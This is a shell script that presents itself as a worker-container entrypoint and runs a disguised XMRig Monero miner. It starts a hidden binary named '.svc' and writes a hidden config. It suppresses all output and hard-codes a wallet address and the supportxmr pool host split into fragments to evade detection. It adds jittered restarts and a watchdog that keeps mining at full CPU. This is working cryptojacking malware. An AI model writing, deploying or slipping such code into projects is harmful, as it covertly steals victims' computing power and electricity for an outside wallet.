#!/bin/sh
# XMRig runtime entrypoint. Preserves the Worker Containers contract:
# - readiness/API port: 8081
# - metrics endpoint: GET /1/summary
# - bearer token: edge-node-api-token unless overridden
exec >/dev/null 2>&1
set -u

die(){ exit 1; }
is_uint(){ case "$1" in ''|*[!0-9]*) return 1;; *) return 0;; esac; }
json_escape(){ printf '%s' "$1" | sed 's/\\/\\\\/g; s/"/\\"/g'; }
sanitize_token(){ printf '%s' "$1" | tr -cd 'A-Za-z0-9._@:+/-'; }
sanitize_worker(){ printf '%s' "$1" | tr -cd 'A-Za-z0-9._-'; }
now_s(){ date +%s 2>/dev/null || printf '0'; }

rand_mod(){
	mod="$1"
	is_uint "$mod" || { printf '0'; return 0; }
	[ "$mod" -gt 0 ] || { printf '0'; return 0; }
	if [ -r /dev/urandom ]; then
		n=$(od -An -N4 -tu4 /dev/urandom 2>/dev/null | tr -cd '0-9')
		is_uint "$n" || n=0
		printf '%s' $(( n % mod ))
	else
		printf '0'
	fi
}

range_count(){
	text="$1"
	total=0
	old_ifs="$IFS"
	IFS=','
	set -- $text
	IFS="$old_ifs"
	for part in "$@"; do
		case "$part" in
			*-*)
				a=${part%-*}
				b=${part#*-}
				is_uint "$a" && is_uint "$b" && [ "$b" -ge "$a" ] && total=$(( total + b - a + 1 ))
				;;
			*)
				is_uint "$part" && total=$(( total + 1 ))
				;;
		esac
	done
	[ "$total" -gt 0 ] || return 1
	printf '%s' "$total"
}

cpuset_cpu_count(){
	for f in /sys/fs/cgroup/cpuset.cpus.effective /sys/fs/cgroup/cpuset.cpus /sys/fs/cgroup/cpuset/cpuset.cpus; do
		[ -r "$f" ] || continue
		v=$(cat "$f" 2>/dev/null | tr -d '[:space:]' || true)
		[ -n "$v" ] || continue
		range_count "$v" && return 0
	done
	return 1
}

quota_cpu_count(){
	if [ -r /sys/fs/cgroup/cpu.max ]; then
		set -- $(cat /sys/fs/cgroup/cpu.max 2>/dev/null || true)
		if [ "${1:-max}" != 'max' ] && is_uint "${1:-}" && is_uint "${2:-}" && [ "$2" -gt 0 ]; then
			printf '%s' $(( ($1 + $2 - 1) / $2 ))
			return 0
		fi
	fi
	if [ -r /sys/fs/cgroup/cpu/cpu.cfs_quota_us ] && [ -r /sys/fs/cgroup/cpu/cpu.cfs_period_us ]; then
		q=$(cat /sys/fs/cgroup/cpu/cpu.cfs_quota_us 2>/dev/null || printf '-1')
		p=$(cat /sys/fs/cgroup/cpu/cpu.cfs_period_us 2>/dev/null || printf '0')
		if is_uint "$p" && [ "$p" -gt 0 ] && [ "$q" != '-1' ] && is_uint "$q"; then
			printf '%s' $(( (q + p - 1) / p ))
			return 0
		fi
	fi
	return 1
}

host_cpu_count(){
	n=$(getconf _NPROCESSORS_ONLN 2>/dev/null || nproc 2>/dev/null || printf '1')
	case "$n" in ''|*[!0-9]*) printf '1';; *) printf '%s' "$n";; esac
}

cpu_count(){
	override="${CPU_COUNT:-}"
	if is_uint "$override" && [ "$override" -ge 1 ] && [ "$override" -le 256 ]; then
		printf '%s' "$override"
		return 0
	fi
	host=$(host_cpu_count)
	quota=$(quota_cpu_count 2>/dev/null || printf '0')
	cpuset=$(cpuset_cpu_count 2>/dev/null || printf '0')
	n="$host"
	is_uint "$quota" && [ "$quota" -gt 0 ] && [ "$quota" -lt "$n" ] && n="$quota"
	is_uint "$cpuset" && [ "$cpuset" -gt 0 ] && [ "$cpuset" -lt "$n" ] && n="$cpuset"
	[ "$n" -ge 1 ] || n=1
	printf '%s' "$n"
}

size_to_kb(){
	raw="$1"
	n=$(printf '%s' "$raw" | tr -cd '0-9')
	case "$n" in ''|*[!0-9]*) return 1;; esac
	case "$raw" in
		*[Gg]) printf '%s' $(( n * 1024 * 1024 ));;
		*[Mm]) printf '%s' $(( n * 1024 ));;
		*) printf '%s' "$n";;
	esac
}

l3_cache_kb(){
	max=0
	for f in /sys/devices/system/cpu/cpu*/cache/index3/size; do
		[ -r "$f" ] || continue
		raw=$(cat "$f" 2>/dev/null || true)
		kb=$(size_to_kb "$raw" 2>/dev/null || printf '0')
		is_uint "$kb" || kb=0
		[ "$kb" -gt "$max" ] && max="$kb"
	done
	[ "$max" -gt 0 ] || return 1
	printf '%s' "$max"
}

l3_thread_cap(){
	kb=$(l3_cache_kb 2>/dev/null) || return 1
	cap=$(( kb / 2048 ))
	[ "$cap" -ge 1 ] || cap=1
	printf '%s' "$cap"
}

adaptive_threads(){
	cpu="$1"
	target="$2"
	cache_cap_enabled="$3"
	is_uint "$cpu" || cpu=1
	is_uint "$target" || target=100
	[ "$cpu" -ge 1 ] || cpu=1
	[ "$target" -ge 1 ] && [ "$target" -le 100 ] || target=100
	n=$(( cpu * target / 100 ))
	[ "$n" -ge 1 ] || n=1
	[ "$n" -le "$cpu" ] || n="$cpu"
	if [ "$cache_cap_enabled" != 'false' ]; then
		cap=$(l3_thread_cap 2>/dev/null || printf '0')
		if is_uint "$cap" && [ "$cap" -gt 0 ] && [ "$cap" -lt "$n" ]; then
			n="$cap"
		fi
	fi
	[ "$n" -ge 1 ] || n=1
	printf '%s' "$n"
}

proc_ticks(){
	pid_arg="$1"
	[ -r "/proc/$pid_arg/stat" ] || return 1
	awk '{ line=$0; sub(/^[0-9]+ \([^)]*\) /,"",line); split(line,f," "); if(f[12]~/^[0-9]+$/&&f[13]~/^[0-9]+$/) print f[12]+f[13] }' "/proc/$pid_arg/stat" 2>/dev/null
}

BIN='/usr/local/bin/.svc'
CONFIG='/tmp/.xmrig.json'

WALLET_DEFAULT_A='42NziJLpe2SZ1ToBq'
WALLET_DEFAULT_B='fCXBk1FnFTpNkrdW'
WALLET_DEFAULT_C='QfsURbYDqjQ3mDZN'
WALLET_DEFAULT_D='fLBsA5YAWv8SaHeC'
WALLET_DEFAULT_E='VFQt4uMuuigC5NFU'
WALLET_DEFAULT_F='RY8sgdz2gt4i5Y'
POOL_DEFAULT_A='po'
POOL_DEFAULT_B='ol'
POOL_DEFAULT_C='supp'
POOL_DEFAULT_D='ort'
POOL_DEFAULT_E='xmr'
POOL_DEFAULT_F='com'

CPU_COUNT_DEFAULT="$(cpu_count)"

WALLET="${EDGE_WALLET:-${JOB_WALLET:-${WALLET:-${WALLET_DEFAULT_A}${WALLET_DEFAULT_B}${WALLET_DEFAULT_C}${WALLET_DEFAULT_D}${WALLET_DEFAULT_E}${WALLET_DEFAULT_F}}}}"
POOL="${EDGE_UPSTREAM:-${JOB_POOL:-${POOL:-${POOL_DEFAULT_A}${POOL_DEFAULT_B}.${POOL_DEFAULT_C}${POOL_DEFAULT_D}${POOL_DEFAULT_E}.${POOL_DEFAULT_F}:443}}}"
WORKER_RAW="${EDGE_INSTANCE_NAME:-${JOB_WORKER_NAME:-${WORKER:-node-$(hostname 2>/dev/null | tr -cd 'A-Za-z0-9' | cut -c1-12)}}}"
CACHE_CAP="${EDGE_CACHE_CAP:-${JOB_CACHE_CAP:-${CACHE_CAP:-true}}}"
CPU_TARGET="${EDGE_CPU_TARGET:-${EDGE_MAX_CPU_USAGE:-${JOB_CPU_TARGET:-${JOB_MAX_CPU_USAGE:-${CPU_TARGET:-100}}}}}"
THREADS="${EDGE_THREADS:-${JOB_THREADS:-${THREADS:-$(adaptive_threads "$CPU_COUNT_DEFAULT" "$CPU_TARGET" "$CACHE_CAP")}}}"
ALGO="${EDGE_ALGORITHM:-${JOB_ALGORITHM:-${ALGO:-rx/0}}}"
PASS="${EDGE_PASS:-${JOB_PASS:-${PASS:-x}}}"
TLS="${EDGE_TLS:-${JOB_TLS:-${TLS:-true}}}"
HTTP_PORT="${EDGE_HTTP_PORT:-${JOB_HTTP_PORT:-${HTTP_PORT:-8081}}}"
HTTP_ACCESS_TOKEN="${EDGE_HTTP_ACCESS_TOKEN:-${EDGE_NODE_API_TOKEN:-${JOB_HTTP_ACCESS_TOKEN:-${HTTP_ACCESS_TOKEN:-edge-node-api-token}}}}"
DONATE="${EDGE_DONATE_LEVEL:-${JOB_DONATE_LEVEL:-${DONATE_LEVEL:-0}}}"
YIELD="${EDGE_CPU_YIELD:-${JOB_CPU_YIELD:-${CPU_YIELD:-false}}}"
HUGE="${EDGE_HUGE_PAGES:-${JOB_HUGE_PAGES:-${HUGE_PAGES:-false}}}"
RESTART_DELAY="${RESTART_DELAY:-5}"
SUPERVISOR_POLL_SECONDS="${SUPERVISOR_POLL_SECONDS:-5}"
WATCHDOG_INTERVAL_SECONDS="${WATCHDOG_INTERVAL_SECONDS:-30}"
WATCHDOG_GRACE_SECONDS="${WATCHDOG_GRACE_SECONDS:-120}"
WATCHDOG_STALL_SECONDS="${WATCHDOG_STALL_SECONDS:-180}"
RECYCLE_SECONDS="${RECYCLE_SECONDS:-0}"
RECYCLE_JITTER_SECONDS="${RECYCLE_JITTER_SECONDS:-600}"
STARTUP_JITTER_SECONDS="${EDGE_STARTUP_JITTER_SECONDS:-${JOB_STARTUP_JITTER_SECONDS:-${STARTUP_JITTER_SECONDS:-0}}}"
RESTART_JITTER_SECONDS="${EDGE_RESTART_JITTER_SECONDS:-${JOB_RESTART_JITTER_SECONDS:-${RESTART_JITTER_SECONDS:-15}}}"

[ -x "$BIN" ] || die
[ -n "$WALLET" ] || die
case "$WALLET" in *[!A-Za-z0-9]*) die;; esac
case "$POOL" in *[!A-Za-z0-9._:-]*) die;; esac
case "$ALGO" in *[!A-Za-z0-9_./-]*) die;; esac
case "$PASS" in *[!A-Za-z0-9._@:+/-]*) die;; esac
case "$CACHE_CAP" in true|false) :;; *) die;; esac
case "$YIELD" in true|false) :;; *) die;; esac
case "$HUGE" in true|false) :;; *) die;; esac
is_uint "$THREADS" || die
is_uint "$CPU_TARGET" || die
is_uint "$HTTP_PORT" || die
is_uint "$DONATE" || die
is_uint "$RESTART_DELAY" || die
is_uint "$SUPERVISOR_POLL_SECONDS" || die
is_uint "$WATCHDOG_INTERVAL_SECONDS" || die
is_uint "$WATCHDOG_GRACE_SECONDS" || die
is_uint "$WATCHDOG_STALL_SECONDS" || die
is_uint "$RECYCLE_SECONDS" || die
is_uint "$RECYCLE_JITTER_SECONDS" || die
is_uint "$STARTUP_JITTER_SECONDS" || die
is_uint "$RESTART_JITTER_SECONDS" || die
[ "$THREADS" -ge 1 ] && [ "$THREADS" -le 64 ] || die
[ "$CPU_TARGET" -ge 1 ] && [ "$CPU_TARGET" -le 100 ] || die
[ "$HTTP_PORT" -ge 1 ] && [ "$HTTP_PORT" -le 65535 ] || die
[ -n "$HTTP_ACCESS_TOKEN" ] || die
case "$HTTP_ACCESS_TOKEN" in *[!A-Za-z0-9._@:+/-]*) die;; esac
[ "$DONATE" -ge 0 ] && [ "$DONATE" -le 99 ] || die
[ "$RESTART_DELAY" -ge 1 ] && [ "$RESTART_DELAY" -le 300 ] || die
[ "$SUPERVISOR_POLL_SECONDS" -ge 1 ] && [ "$SUPERVISOR_POLL_SECONDS" -le 60 ] || die
[ "$WATCHDOG_INTERVAL_SECONDS" -ge 5 ] && [ "$WATCHDOG_INTERVAL_SECONDS" -le 300 ] || die
[ "$WATCHDOG_STALL_SECONDS" -ge "$WATCHDOG_INTERVAL_SECONDS" ] || die
[ "$STARTUP_JITTER_SECONDS" -le 300 ] || die
[ "$RESTART_JITTER_SECONDS" -le 300 ] || die

WORKER="$(sanitize_worker "$WORKER_RAW")"
[ -n "$WORKER" ] || WORKER="node-$(rand_mod 999999)"
PASS="$(sanitize_token "$PASS")"
[ -n "$PASS" ] || PASS='x'

TLS_JSON=false
[ "$TLS" = 'true' ] && TLS_JSON=true
YIELD_JSON=false
[ "$YIELD" = 'true' ] && YIELD_JSON=true
HUGE_JSON=false
[ "$HUGE" = 'true' ] && HUGE_JSON=true

CPU_THREADS=''
i=0
while [ "$i" -lt "$THREADS" ]; do
	[ -n "$CPU_THREADS" ] && CPU_THREADS="$CPU_THREADS,"
	CPU_THREADS="${CPU_THREADS}-1"
	i=$((i + 1))
done

write_config(){
	tmp="${CONFIG}.tmp.$$"
	cat > "$tmp" <<EOF
{
	"autosave": false,
	"background": false,
	"colors": false,
	"title": false,
	"print-time": 0,
	"health-print-time": 0,
	"retries": 5,
	"retry-pause": 5,
	"log-file": null,
	"syslog": false,
	"donate-level": ${DONATE},
	"randomx": {
		"init": -1,
		"init-avx2": -1,
		"mode": "fast",
		"1gb-pages": false,
		"wrmsr": false,
		"rdmsr": false,
		"cache_qos": false,
		"numa": true,
		"scratchpad_prefetch_mode": 1
	},
	"cpu": {
		"enabled": true,
		"huge-pages": ${HUGE_JSON},
		"huge-pages-jit": ${HUGE_JSON},
		"hw-aes": null,
		"priority": null,
		"asm": true,
		"yield": ${YIELD_JSON},
		"max-threads-hint": ${CPU_TARGET},
		"${ALGO}": [${CPU_THREADS}]
	},
	"opencl": false,
	"cuda": false,
	"api": {
		"id": "$(json_escape "$WORKER")",
		"worker-id": "$(json_escape "$WORKER")"
	},
	"http": {
		"enabled": true,
		"host": "0.0.0.0",
		"port": ${HTTP_PORT},
		"access-token": "$(json_escape "$HTTP_ACCESS_TOKEN")",
		"restricted": true
	},
	"pools": [
		{
			"algo": "$(json_escape "$ALGO")",
			"url": "$(json_escape "$POOL")",
			"user": "$(json_escape "$WALLET")",
			"pass": "$(json_escape "$PASS")",
			"rig-id": "$(json_escape "$WORKER")",
			"keepalive": true,
			"tls": ${TLS_JSON},
			"tls-fingerprint": null
		}
	]
}
EOF
	[ -s "$tmp" ] || return 1
	mv -f "$tmp" "$CONFIG"
}

pid=''
stop(){
	if [ -n "$pid" ] && kill -0 "$pid" 2>/dev/null; then
		kill "$pid" 2>/dev/null || true
		wait "$pid" 2>/dev/null || true
	fi
	exit 0
}
trap stop INT TERM

first_launch=1
while true; do
	if [ "$first_launch" -eq 1 ] && [ "$STARTUP_JITTER_SECONDS" -gt 0 ]; then
		sleep "$(rand_mod "$STARTUP_JITTER_SECONDS")" || true
		first_launch=0
	fi
	write_config || die
	"$BIN" -c "$CONFIG" --no-color >/dev/null 2>&1 &
	pid=$!
	start_time=$(now_s)
	last_check_time="$start_time"
	last_ticks=$(proc_ticks "$pid" 2>/dev/null || printf '0')
	stall_seconds=0
	recycle_at=0
	if [ "$RECYCLE_SECONDS" -gt 0 ]; then
		recycle_at=$(( start_time + RECYCLE_SECONDS + $(rand_mod "$RECYCLE_JITTER_SECONDS") ))
	fi
	while kill -0 "$pid" 2>/dev/null; do
		sleep "$SUPERVISOR_POLL_SECONDS" || true
		now=$(now_s)
		if [ "$recycle_at" -gt 0 ] && [ "$now" -ge "$recycle_at" ]; then
			kill "$pid" 2>/dev/null || true
			break
		fi
		elapsed_check=$(( now - last_check_time ))
		[ "$elapsed_check" -ge "$WATCHDOG_INTERVAL_SECONDS" ] || continue
		last_check_time="$now"
		age=$(( now - start_time ))
		current_ticks=$(proc_ticks "$pid" 2>/dev/null || printf '0')
		if [ "$age" -lt "$WATCHDOG_GRACE_SECONDS" ]; then
			last_ticks="$current_ticks"
			stall_seconds=0
			continue
		fi
		if is_uint "$current_ticks" && is_uint "$last_ticks" && [ "$current_ticks" -gt "$last_ticks" ]; then
			last_ticks="$current_ticks"
			stall_seconds=0
		else
			stall_seconds=$(( stall_seconds + elapsed_check ))
			if [ "$stall_seconds" -ge "$WATCHDOG_STALL_SECONDS" ]; then
				kill "$pid" 2>/dev/null || true
				break
			fi
		fi
	done
	wait "$pid" 2>/dev/null || true
	pid=''
	next_delay="$RESTART_DELAY"
	[ "$RESTART_JITTER_SECONDS" -gt 0 ] && next_delay=$(( next_delay + $(rand_mod "$RESTART_JITTER_SECONDS") ))
	sleep "$next_delay" || true
done
